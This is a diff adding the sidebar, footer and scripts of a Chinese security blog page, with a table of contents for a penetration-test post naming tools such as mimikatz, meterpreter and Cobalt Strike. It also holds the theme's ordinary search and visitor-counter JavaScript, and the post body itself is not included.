+                  <li class="links-of-blogroll-item">
+                    <a href="http://gxgoodboy.lofter.com/" title="Goodboy" target="_blank">Goodboy</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.secice.cn" title="iceH's Blog" target="_blank">iceH's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.chabug.org" title="ChaBug安全" target="_blank">ChaBug安全</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://cate4cafe.com" title="cate4cafe" target="_blank">cate4cafe</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://k8gege.org" title="k8gege" target="_blank">k8gege</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#信息收集"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击"><span class="nav-number">2.</span> <span class="nav-text">攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#域信息收集"><span class="nav-number">2.1.</span> <span class="nav-text">域信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#迷惑点"><span class="nav-number">2.1.1.</span> <span class="nav-text">迷惑点</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权失败"><span class="nav-number">2.2.</span> <span class="nav-text">提权失败</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-Exploit-Suggester（提权辅助工具）"><span class="nav-number">2.2.1.</span> <span class="nav-text">Windows-Exploit-Suggester（提权辅助工具）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ms15-051"><span class="nav-number">2.2.2.</span> <span class="nav-text">ms15-051</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#meterpreter"><span class="nav-number">2.2.3.</span> <span class="nav-text">meterpreter</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内网游游"><span class="nav-number">3.</span> <span class="nav-text">内网游游</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#远程登入"><span class="nav-number">3.1.</span> <span class="nav-text">远程登入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mimiktaz"><span class="nav-number">3.2.</span> <span class="nav-text">mimiktaz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cobalt-Strike"><span class="nav-number">3.3.</span> <span class="nav-text">Cobalt Strike</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF"><span class="nav-number">3.4.</span> <span class="nav-text">MSF</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NTDS-dit文件"><span class="nav-number">4.</span> <span class="nav-text">NTDS.dit文件</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Hone老帅</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">此处招租</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  
+
+
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.0.6"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.0.6"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.0.6"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.0.6"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.0.6"></script>
+
+
+
+  
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("E375xCJTHPvBWQQsLQwVquyQ-gzGzoHsz", "wMz9L7akGsy7ATec1hzsFkUu");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            
+            counter.save(null, {
+              success: function(counter) {
+                
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(counter.get('time'));
+                
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            
+              var newcounter = new Counter();
+              /* Set ACL */
+              var acl = new AV.ACL();
+              acl.setPublicReadAccess(true);
+              acl.setPublicWriteAccess(true);
+              newcounter.setACL(acl);
+              /* End Set ACL */
+              newcounter.set("title", title);
+              newcounter.set("url", url);
+              newcounter.set("time", 1);
+              newcounter.save(null, {
+                success: function(newcounter) {
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+                },
+                error: function(newcounter, error) {
+                  console.log('Failed to create');
+                }
+              });
+            
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
